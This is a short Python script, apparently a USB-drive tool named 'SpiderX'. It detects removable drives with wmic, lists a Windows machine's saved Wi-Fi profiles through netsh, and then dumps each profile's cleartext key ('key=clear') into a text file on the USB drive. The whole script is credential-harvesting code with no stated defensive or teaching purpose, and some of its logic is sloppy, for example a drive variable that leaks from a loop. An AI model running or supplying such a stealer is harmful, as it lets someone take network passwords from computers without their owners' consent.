
import subprocess

def get_removable_drives():
    cmd = 'wmic logicaldisk where drivetype=2 get deviceid /format:list'
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    removable_drives = []
    if result.returncode == 0:
        output_lines = result.stdout.strip().split('\n')
        for line in output_lines:
            if line.startswith("DeviceID="):
                drive_letter = line.split("=")[1]
                removable_drives.append(drive_letter)
    return removable_drives

removable_drives = get_removable_drives()
if removable_drives:
    for drive in removable_drives:
        pass
else:
    print("No removable drives found.")

def run_command(command):
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def mainfunction():
    profiles_output = run_command(['netsh', 'wlan', 'show', 'profiles'])
    path2 = f"{drive}\\SpiderX\\access_point.txt"
    with open(path2, "a") as F:
        F.writelines(profiles_output)
        F.write("\n")
    with open(path2, "r") as R:
       new =  R.readlines()
       name = []
       for i in new :
           name.append(i)
    
    for i in range (0, 15):
        if '-------------\n' == name[i]:
            start = i + 1
            First =  name[start]
            break
    access_point = []
    end = len(name)
    
    
    for i  in range(start, end):
        add = name[i].replace("    All User Profile     : ",'')
        add.replace('\n','')
        access_point.append(add)
    cleaned_data = [item.strip() for item in access_point if item.strip()]
    return cleaned_data

path = f"{drive}\\SpiderX\\SpiderX\\WIFI-password\\info.txt"
MakeFileCmd =  f'echo "[Check out key-content]" > {path}'
subprocess.run(MakeFileCmd,shell=True)

def collect_info():
    # Run the command and capture its output
    collect = mainfunction()
    for i in collect:
        command = f'netsh wlan show profile name="{i}" key=clear'
        # Decode the bytes output to string
        output_str = run_command(command)
        with open(path, "a") as F:
            F.writelines(output_str)
            F.write("\n")
        


collect_info()

